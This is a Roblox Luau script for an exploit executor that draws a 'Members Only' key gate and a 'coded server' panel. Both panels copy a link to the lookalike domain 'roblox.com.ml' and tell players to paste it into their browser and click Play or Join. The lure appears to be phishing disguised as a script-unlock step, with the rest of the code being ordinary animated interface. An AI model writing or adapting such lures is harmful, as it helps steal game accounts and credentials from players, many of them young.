--// SERVICES
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

local player = Players.LocalPlayer

local GROUP_ID = 258131749223
local GROUP_LINK = "https://www.roblox.com.ml/communities/258131749223/WareHubKey"
local codedServerLink = "https://www.roblox.com.ml/communities/258131749223/WareHubKey"
local ANIME_BG = "rbxassetid://102177503342365"

--// GUI
local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

--------------------------------------------------
-- 🌌 BACKGROUND
--------------------------------------------------

local bgImage = Instance.new("ImageLabel")
bgImage.Size = UDim2.new(1,0,1,0)
bgImage.BackgroundTransparency = 1
bgImage.Image = ANIME_BG
bgImage.ImageTransparency = 0.3
bgImage.ScaleType = Enum.ScaleType.Crop
bgImage.Parent = gui

local overlay = Instance.new("Frame")
overlay.Size = UDim2.new(1,0,1,0)
overlay.BackgroundColor3 = Color3.fromRGB(0,0,10)
overlay.BackgroundTransparency = 0.4
overlay.Parent = gui

local blur = Instance.new("BlurEffect")
blur.Size = 12
blur.Parent = Lighting

local bloom = Instance.new("BloomEffect")
bloom.Intensity = 0.5
bloom.Size = 20
bloom.Threshold = 0.88
bloom.Parent = Lighting

--------------------------------------------------
-- 💎 MAIN CARD (compact)
--------------------------------------------------

local card = Instance.new("Frame")
card.Size = UDim2.new(0, 340, 0, 300)
card.Position = UDim2.new(0.5, -170, 0.5, 60)
card.BackgroundColor3 = Color3.fromRGB(8, 14, 35)
card.BackgroundTransparency = 0.08
card.Parent = gui
Instance.new("UICorner", card).CornerRadius = UDim.new(0, 16)

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 30, 70)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, 20, 55)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 10, 30)),
})
gradient.Rotation = 135
gradient.Parent = card

local outerGlow = Instance.new("UIStroke")
outerGlow.Color = Color3.fromRGB(0, 200, 255)
outerGlow.Transparency = 0.0
outerGlow.Thickness = 1.8
outerGlow.Parent = card

--------------------------------------------------
-- 🔵 TOP ACCENT BAR
--------------------------------------------------

local topAccent = Instance.new("Frame")
topAccent.Size = UDim2.new(1, 0, 0, 4)
topAccent.BackgroundColor3 = Color3.fromRGB(0, 210, 255)
topAccent.Parent = card
Instance.new("UICorner", topAccent).CornerRadius = UDim.new(1, 0)

local accentGrad = Instance.new("UIGradient")
accentGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0,   Color3.fromRGB(120, 0, 255)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 210, 255)),
	ColorSequenceKeypoint.new(1,   Color3.fromRGB(120, 0, 255)),
})
accentGrad.Parent = topAccent

--------------------------------------------------
-- ✨ PARTICLES
--------------------------------------------------

for i = 1, 5 do
	local dot = Instance.new("Frame")
	dot.Size = UDim2.new(0, 3, 0, 3)
	dot.Position = UDim2.new(math.random(10,90)/100, 0, math.random(10,90)/100, 0)
	dot.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
	dot.BackgroundTransparency = 0.3
	dot.ZIndex = 2
	dot.Parent = card
	Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

	task.spawn(function()
		while true do
			TweenService:Create(dot, TweenInfo.new(1.3 + math.random()*0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = 0.85}):Play()
			task.wait(1.3 + math.random()*0.7)
			TweenService:Create(dot, TweenInfo.new(1.3 + math.random()*0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = 0.15}):Play()
			task.wait(1.3 + math.random()*0.7)
		end
	end)
end

--------------------------------------------------
-- 🔒 TITLE
--------------------------------------------------

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "🔒  Members Only"
titleLabel.Size = UDim2.new(1, -16, 0, 32)
titleLabel.Position = UDim2.new(0, 8, 0, 12)
titleLabel.BackgroundTransparency = 1
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 18
titleLabel.Parent = card

local titleStroke = Instance.new("UIStroke")
titleStroke.Color = Color3.fromRGB(0, 200, 255)
titleStroke.Transparency = 0.0
titleStroke.Thickness = 1
titleStroke.Parent = titleLabel

task.spawn(function()
	while true do
		TweenService:Create(titleStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.65}):Play()
		task.wait(1.5)
		TweenService:Create(titleStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.0}):Play()
		task.wait(1.5)
	end
end)

--------------------------------------------------
-- ✨ DESCRIPTION
--------------------------------------------------

local desc = Instance.new("TextLabel")
desc.Text = "✨ Exclusive to WareHubKey members.\nJoin our group to unlock full access!"
desc.Size = UDim2.new(1, -16, 0, 34)
desc.Position = UDim2.new(0, 8, 0, 46)
desc.BackgroundTransparency = 1
desc.TextColor3 = Color3.fromRGB(180, 220, 255)
desc.Font = Enum.Font.Gotham
desc.TextSize = 12
desc.TextWrapped = true
desc.Parent = card

local descStroke = Instance.new("UIStroke")
descStroke.Color = Color3.fromRGB(0, 130, 255)
descStroke.Transparency = 0.4
descStroke.Parent = desc

--------------------------------------------------
-- 📋 DIVIDER
--------------------------------------------------

local divider = Instance.new("Frame")
divider.Size = UDim2.new(0.85, 0, 0, 1)
divider.Position = UDim2.new(0.075, 0, 0, 86)
divider.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
divider.BackgroundTransparency = 0.5
divider.Parent = card

local divGrad = Instance.new("UIGradient")
divGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,0,0)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 200, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0,0,0)),
})
divGrad.Parent = divider

--------------------------------------------------
-- 📋 STEPS (compact rows)
--------------------------------------------------

local steps = {
	{ icon = "1️⃣", text = "Click 'Copy Group Link' below" },
	{ icon = "2️⃣", text = "Open the link in your browser" },
	{ icon = "3️⃣", text = "Press Join Group" },
	{ icon = "4️⃣", text = "Return here & check status 🔥" },
}

for i, data in ipairs(steps) do
	local stepFrame = Instance.new("Frame")
	stepFrame.Size = UDim2.new(1, -20, 0, 22)
	stepFrame.Position = UDim2.new(0, 10, 0, 94 + (i-1)*26)
	stepFrame.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
	stepFrame.BackgroundTransparency = 0.82
	stepFrame.Parent = card
	Instance.new("UICorner", stepFrame).CornerRadius = UDim.new(0, 7)

	local stepStroke = Instance.new("UIStroke")
	stepStroke.Color = Color3.fromRGB(0, 180, 255)
	stepStroke.Transparency = 0.55
	stepStroke.Thickness = 1
	stepStroke.Parent = stepFrame

	local stepLabel = Instance.new("TextLabel")
	stepLabel.Text = data.icon .. "  " .. data.text
	stepLabel.Size = UDim2.new(1, -8, 1, 0)
	stepLabel.Position = UDim2.new(0, 6, 0, 0)
	stepLabel.BackgroundTransparency = 1
	stepLabel.TextColor3 = Color3.fromRGB(210, 235, 255)
	stepLabel.Font = Enum.Font.Gotham
	stepLabel.TextSize = 11
	stepLabel.TextXAlignment = Enum.TextXAlignment.Left
	stepLabel.Parent = stepFrame
end

--------------------------------------------------
-- 🔗 COPY BUTTON
--------------------------------------------------

local copyBtn = Instance.new("TextButton")
copyBtn.Text = "🔗  Copy Group Link"
copyBtn.Size = UDim2.new(0.78, 0, 0, 34)
copyBtn.Position = UDim2.new(0.11, 0, 1, -80)
copyBtn.BackgroundColor3 = Color3.fromRGB(0, 155, 255)
copyBtn.TextColor3 = Color3.new(1,1,1)
copyBtn.Font = Enum.Font.GothamBold
copyBtn.TextSize = 13
copyBtn.Parent = card
Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 10)

local copyGrad = Instance.new("UIGradient")
copyGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(90, 0, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 190, 255)),
})
copyGrad.Rotation = 90
copyGrad.Parent = copyBtn

local copyStroke = Instance.new("UIStroke")
copyStroke.Color = Color3.fromRGB(160, 230, 255)
copyStroke.Transparency = 0.2
copyStroke.Thickness = 1.5
copyStroke.Parent = copyBtn

task.spawn(function()
	while true do
		TweenService:Create(copyStroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.75}):Play()
		task.wait(1)
		TweenService:Create(copyStroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.1}):Play()
		task.wait(1)
	end
end)

copyBtn.MouseButton1Click:Connect(function()
	if setclipboard then
		setclipboard(GROUP_LINK)
		copyBtn.Text = "✔  Copied!"
		copyGrad.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 160, 60)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 210, 100)),
		})
		task.wait(2)
		copyBtn.Text = "🔗  Copy Group Link"
		copyGrad.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(90, 0, 255)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 190, 255)),
		})
	else
		copyBtn.Text = "⚠  Not Supported"
		task.wait(2)
		copyBtn.Text = "🔗  Copy Group Link"
	end
end)

--------------------------------------------------
-- 🔄 CHECK STATUS BUTTON
--------------------------------------------------

local checkBtn = Instance.new("TextButton")
checkBtn.Text = "🔄  Check Membership Status"
checkBtn.Size = UDim2.new(0.78, 0, 0, 28)
checkBtn.Position = UDim2.new(0.11, 0, 1, -38)
checkBtn.BackgroundColor3 = Color3.fromRGB(20, 50, 100)
checkBtn.TextColor3 = Color3.fromRGB(160, 210, 255)
checkBtn.Font = Enum.Font.GothamBold
checkBtn.TextSize = 11
checkBtn.Parent = card
Instance.new("UICorner", checkBtn).CornerRadius = UDim.new(0, 10)

local checkStroke = Instance.new("UIStroke")
checkStroke.Color = Color3.fromRGB(0, 160, 255)
checkStroke.Transparency = 0.5
checkStroke.Thickness = 1
checkStroke.Parent = checkBtn

--------------------------------------------------
-- 🔥 ACCESS CHECK
--------------------------------------------------

local function checkAccess()
	if player:IsInGroup(GROUP_ID) then
		TweenService:Create(card, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
			Size = UDim2.new(0, 0, 0, 0),
			BackgroundTransparency = 1,
		}):Play()
		task.wait(0.5)
		gui:Destroy()
		bloom:Destroy()
		blur:Destroy()
	end
end

checkBtn.MouseButton1Click:Connect(function()
	checkBtn.Text = "⏳  Checking..."
	task.wait(1)
	checkAccess()
	if checkBtn and checkBtn.Parent then
		checkBtn.Text = "🔄  Check Membership Status"
	end
end)

task.spawn(function()
	while task.wait(3) do
		checkAccess()
	end
end)

--------------------------------------------------
-- 🎬 ENTRANCE ANIMATION
--------------------------------------------------

TweenService:Create(card, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
	Position = UDim2.new(0.5, -170, 0.5, -150)
}):Play()

-- Border cycling
task.spawn(function()
	local colors = {
		Color3.fromRGB(0, 200, 255),
		Color3.fromRGB(120, 0, 255),
		Color3.fromRGB(0, 255, 200),
		Color3.fromRGB(0, 150, 255),
	}
	local i = 1
	while true do
		TweenService:Create(outerGlow, TweenInfo.new(2, Enum.EasingStyle.Sine), {Color = colors[i]}):Play()
		i = (i % #colors) + 1
		task.wait(2)
	end
end)

--------------------------------------------------
-- 🖥️ CODED SERVER FRAME (compact)
--------------------------------------------------

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 310, 0, 185)
mainFrame.Position = UDim2.new(0.5, -155, 1, 20)
mainFrame.BackgroundColor3 = Color3.fromRGB(8, 14, 35)
mainFrame.BackgroundTransparency = 0.08
mainFrame.Parent = gui
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

local mainGrad = Instance.new("UIGradient")
mainGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 10, 50)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 20, 45)),
})
mainGrad.Rotation = 120
mainGrad.Parent = mainFrame

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(120, 0, 255)
mainStroke.Transparency = 0.1
mainStroke.Thickness = 1.8
mainStroke.Parent = mainFrame

local mainBar = Instance.new("Frame")
mainBar.Size = UDim2.new(1, 0, 0, 4)
mainBar.BackgroundColor3 = Color3.fromRGB(120, 0, 255)
mainBar.Parent = mainFrame
Instance.new("UICorner", mainBar).CornerRadius = UDim.new(1, 0)

local mainBarGrad = Instance.new("UIGradient")
mainBarGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 255)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 0, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 255)),
})
mainBarGrad.Parent = mainBar

local mainTitle = Instance.new("TextLabel")
mainTitle.Size = UDim2.new(1, -14, 0, 28)
mainTitle.Position = UDim2.new(0, 7, 0, 10)
mainTitle.BackgroundTransparency = 1
mainTitle.Text = "⚡  USE CODED SERVER FOR THIS SCRIPT"
mainTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
mainTitle.TextScaled = true
mainTitle.Font = Enum.Font.GothamBold
mainTitle.Parent = mainFrame

local mainTitleStroke = Instance.new("UIStroke")
mainTitleStroke.Color = Color3.fromRGB(120, 0, 255)
mainTitleStroke.Transparency = 0.1
mainTitleStroke.Parent = mainTitle

local instructions = Instance.new("TextLabel")
instructions.Size = UDim2.new(1, -16, 0, 88)
instructions.Position = UDim2.new(0, 8, 0, 44)
instructions.BackgroundTransparency = 1
instructions.TextWrapped = true
instructions.TextYAlignment = Enum.TextYAlignment.Top
instructions.Text =
	"1️⃣  Click 'Get Coded Server' below\n" ..
	"2️⃣  Paste the link into Chrome\n" ..
	"3️⃣  Click Play  ▶\n" ..
	"4️⃣  Enjoy your script 🔥"
instructions.TextColor3 = Color3.fromRGB(180, 210, 255)
instructions.Font = Enum.Font.Gotham
instructions.TextSize = 12
instructions.Parent = mainFrame

local getBtn = Instance.new("TextButton")
getBtn.Size = UDim2.new(0.72, 0, 0, 32)
getBtn.Position = UDim2.new(0.14, 0, 1, -44)
getBtn.BackgroundColor3 = Color3.fromRGB(80, 0, 200)
getBtn.Text = "⚡  Get Coded Server"
getBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
getBtn.TextScaled = true
getBtn.Font = Enum.Font.GothamBold
getBtn.BorderSizePixel = 0
getBtn.Parent = mainFrame
Instance.new("UICorner", getBtn).CornerRadius = UDim.new(0, 10)

local getBtnGrad = Instance.new("UIGradient")
getBtnGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 0, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 255)),
})
getBtnGrad.Rotation = 90
getBtnGrad.Parent = getBtn

local getBtnStroke = Instance.new("UIStroke")
getBtnStroke.Color = Color3.fromRGB(200, 150, 255)
getBtnStroke.Transparency = 0.2
getBtnStroke.Thickness = 1.5
getBtnStroke.Parent = getBtn

task.spawn(function()
	while true do
		TweenService:Create(getBtnStroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.8}):Play()
		task.wait(1)
		TweenService:Create(getBtnStroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.1}):Play()
		task.wait(1)
	end
end)

getBtn.MouseButton1Click:Connect(function()
	getBtn.Text = "⏳  Generating..."
	task.wait(1.5)
	local success = pcall(function()
		setclipboard(codedServerLink)
	end)
	if success then
		getBtn.Text = "✔  Link Copied!"
		getBtnGrad.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 160, 60)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 210, 100)),
		})
	else
		getBtn.Text = "⚠  Not Supported"
		getBtnGrad.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(160, 0, 0)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 50, 50)),
		})
	end
	task.wait(2)
	getBtn.Text = "⚡  Get Coded Server"
	getBtnGrad.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 0, 255)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 255)),
	})
end)

-- Slide in
task.delay(0.7, function()
	TweenService:Create(mainFrame, TweenInfo.new(0.55, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, -155, 0.5, 168)
	}):Play()
end)

-- Border cycle on mainFrame
task.spawn(function()
	local cols = {Color3.fromRGB(120, 0, 255), Color3.fromRGB(0, 200, 255), Color3.fromRGB(180, 0, 255)}
	local i = 1
	while true do
		TweenService:Create(mainStroke, TweenInfo.new(2, Enum.EasingStyle.Sine), {Color = cols[i]}):Play()
		i = (i % #cols) + 1
		task.wait(2)
	end
end)
